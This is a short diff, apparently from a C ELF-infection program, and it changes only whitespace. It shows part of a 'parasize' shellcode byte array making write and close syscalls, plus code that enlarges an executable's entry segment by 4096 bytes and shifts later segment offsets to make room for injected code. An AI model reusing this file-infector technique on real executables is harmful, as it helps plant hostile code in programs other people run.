@@ -111,7 +111,7 @@ char parasize[] = {
 	0xcd, 0x80, //int 0x80 (offset 24, size 2
 	0x89, 0xc3, //mov ebx, eax (offset 26, size 2
 	0xb9, 0x00, 0x00, 0x00, 0x00, //mov ecx, 0 (offset 28, size 5
-    0xba, 0x00, 0x00, 0x00, 0x00, //mov edx, 0 (offset 33, size 5
+        0xba, 0x00, 0x00, 0x00, 0x00, //mov edx, 0 (offset 33, size 5
 	0xb8, 0x04, 0x00, 0x00, 0x00, //mov eax, 4 (offset 38, size 5
 	0xcd, 0x80, //int 0x80 (offset 43, size 2
 	0xb8, 0x06, 0x00, 0x00, 0x00, //mov eax, 6 (offset 45, size 5
@@ -139,7 +139,7 @@ for(int i = 0; i<(int)p_ehdr->e_phnum; i++){
     read(origfile,elf_phdr,sizeof(elf_phdr));
     if (p_phdr->p_paddr < orgi_entry && (p_phdr->p_paddr + p_phdr->p_filesz)>orgi_entry) {
         p_phdr->p_filesz += 4096;
-	    p_phdr->p_memsz += 4096;
+	p_phdr->p_memsz += 4096;
     }else if(p_phdr->p_offset > entry_section_offset)
         p_phdr->p_offset += 4096;
     write(newfile,elf_phdr,sizeof(elf_phdr));
